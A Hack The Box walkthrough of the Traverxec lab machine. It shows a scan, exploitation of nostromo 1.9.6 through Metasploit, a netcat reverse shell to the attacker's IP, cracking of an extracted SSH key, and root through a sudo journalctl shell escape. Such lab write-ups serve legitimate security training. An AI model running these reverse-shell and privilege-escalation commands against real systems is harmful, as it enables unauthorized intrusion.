# HTB - Traverxec
## OS - Linux

Started with an nmap scan as usual. (IP address: 10.10.10.165)

```
$nmap -sC -sV -oN traverxec.nmap 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-21 17:06 PST
Nmap scan report for 10.10.10.165
Host is up (0.095s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds


```
The machine is running nostromo v1.9.6 as the web server. When I searched for nostromo, I saw that metasploit has a module for it.

Using msfconsole to use that exploit,

```
msf6 > use exploit/multi/http/nostromo_code_exec
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf6 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.14.25:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.25:4444 -> 10.10.10.165:51758) at 2021-02-21 18:19:58 -0800
```

There is also an exploit for this at https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py.

```
python exploit.py 10.10.10.165 80 'nc 10.10.14.9 4444 -c bash'
```

Once we get a shell, we loo around in /var/nostromo.

conf/nhttp.conf shows 

```
# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

There's a .htpasswd file with contents:
```
www-data@traverxec:/var/nostromo/conf$ more .htpasswd
more .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/var/nostromo/conf$
```

If we look at /home/david, we get permission denied. But when we go to /home/david/public_www. we see a folder "protected-file-area".

```
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www
ls -l /home/david/public_www
total 8
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/public_www/protected-file-area
<f$ ls -l /home/david/public_www/protected-file-area
total 4
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

We copy the tgz file to /tmp and extract it.

```
   www-data@traverxec:/tmp$ tar xvzf backup-ssh-identity-files.tgz
tar xvzf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```
The private key is there, and it is encrypted.

```
www-data@traverxec:/tmp/home/david/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```


We download ssh2john.py and run it to make it readable by john to crack.

```
$python ssh2john.py pvt-key.txt > ssh.txt


$more ssh.txt 
pvt-key.txt:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f53
95468c76f1d92bfdaa7f2f29c3076bf6c<clipped>
```

And we run john the ripper.

```
$john ssh.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes


Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
hunter           (pvt-key.txt)
Proceeding with incremental:ASCII
hunter           (pvt-key.txt)
```

The password is hunter.

Now we can ssh as david using the private key and the password.
```
$ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
```
There's a bin folder in there.

```
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ more server-stats.head 
```
It shows ascii art file.

The shell script has:

```
david@traverxec:~/bin$ more server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -
l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

so david has sudo permissions to run journalctl with that file. If we run the last line in the script without cat but using less,

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2021-03-20 15:40:23 EDT, end at Sat 2021-03-20 20:17:47 EDT
Mar 20 17:30:00 traverxec crontab[13870]: (www-data) LIST (www-data)
Mar 20 17:30:02 traverxec sudo[16210]: pam_unix(sudo:auth): authentication failu
Mar 20 17:30:04 traverxec sudo[16210]: pam_unix(sudo:auth): conversation failed
Mar 20 17:30:04 traverxec sudo[16210]: pam_unix(sudo:auth): auth could not ident
Mar 20 17:30:04 traverxec sudo[16210]: www-data : command not allowed ; TTY=pts/
!/bin/bash
root@traverxec:/home/david/bin# 
```

Here we used shell escape !/bin/bash in less or journalctl to escape to root account. And we get the root flag.

